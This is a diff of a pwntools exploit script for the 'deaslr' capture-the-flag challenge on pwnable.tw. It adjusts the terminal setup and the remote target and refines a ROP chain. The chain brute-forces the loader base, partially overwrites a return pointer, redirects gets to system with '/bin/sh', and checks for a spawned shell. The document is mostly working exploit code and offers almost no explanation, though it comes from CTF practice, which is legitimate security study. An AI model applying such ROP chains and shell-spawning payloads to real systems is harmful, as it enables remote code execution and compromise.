@@ -32,7 +32,7 @@ exe = ELF("deaslr_patched", checksec=False)
 libc = ELF("libc_64.so.6", checksec=False)
 ld = ELF("./ld-2.23.so", checksec=False)
 
-context.terminal = ["/usr/bin/tilix", "-a", "session-add-right", "-e", "bash", "-c"]
+context.terminal = ["/mnt/c/Windows/system32/cmd.exe", "/c", "start", "wt.exe", "-w", "0", "split-pane", "-V", "-s", "0.5", "wsl.exe", "-d", "Ubuntu-24.04", "bash", "-c"]
 context.binary = exe
 
 gdbscript = '''
@@ -48,12 +48,12 @@ continue
 
 def conn():
     if args.LOCAL:
-        p = process([exe.path])
+        p = process(exe.path)
         sleep(0.1)
         return p
     else:
-        host = "127.0.0.1"
-        port = 1337
+        host = "chall.pwnable.tw"
+        port = 10402
         return remote(host, port)
 
 '''
@@ -99,8 +99,8 @@ Search for register calls: "\bcall\s+r(?:ax|bx|cx|dx|si|di|sp|bp|8|9|1[0-5])\b"
 gets_to_system = libc.symbols['system'] - libc.symbols['gets']
 pop_rbx_rbp_r12_r13_r14_r15_ret = 0x4005ba
 pop_rdi_ret = 0x4005c3
-binsh_addr = exe.bss()
 offset_addr = exe.bss() + 8
+binsh_addr = exe.bss()
 nop_ret = 0x4005c8
 
 attempt = 0
@@ -110,21 +110,20 @@ while True:
 
     p = conn()
 
-    # if args.LOCAL:
-    #     with open(f'/proc/{p.pid}/maps') as f:
-    #         ld_lines = [line for line in f if 'ld-2.23.so' in line]
-    #     for line in ld_lines:
-    #         print(line, end='')
-    #     ld_base = int(ld_lines[0].split('-')[0], 16)
-    #     if ld_base % 0x1000000 == 0:
-    #         if args.GDB:
-    #             gdb.attach(p, gdbscript=gdbscript)
-    #             sleep(1)
-    #     else:
-    #         p.close()
-    #         continue
+    # Ubuntu 24.04
+    if args.LOCAL:
+        with open(f'/proc/{p.pid}/maps') as f:
+            ld_lines = [line for line in f if 'ld-2.23.so' in line]
+        print(ld_lines[0], end='')
+        if int(ld_lines[0].split('-')[0], 16) % 0x1000000 == 0:
+            if args.GDB:
+                gdb.attach(p, gdbscript=gdbscript)
+                sleep(1)
+        else:
+            p.close()
+            continue
 
-    sl(p, flat(
+    pl = flat(
         A(0x18),
 
         pop_rdi_ret,
@@ -140,19 +139,24 @@ while True:
         binsh_addr,
 
         p64(nop_ret) * 6,
+    )
 
-        p16(0xc7f0)
-    ))
+    if args.LOCAL:
+        pl += p16(0xc7f0) # Ubuntu 24.04
+    else:
+        pl += p8(0xb0) # Ubuntu 16.04
+
+    sl(p, pl)
     
     sleep(0.25)
 
-    if args.GDB:
-        input("Send /bin/sh")
-
     sl(p, flat(b'/bin/sh\0', gets_to_system))
-
+    
+    if args.GDB:
+        input()
+        
     try:
-        sleep(0.25)
+        sleep(0.5)
         sl(p, b'id')
         if p.recvuntil(b'id', timeout=0.5):
             print("Spawn shell:")
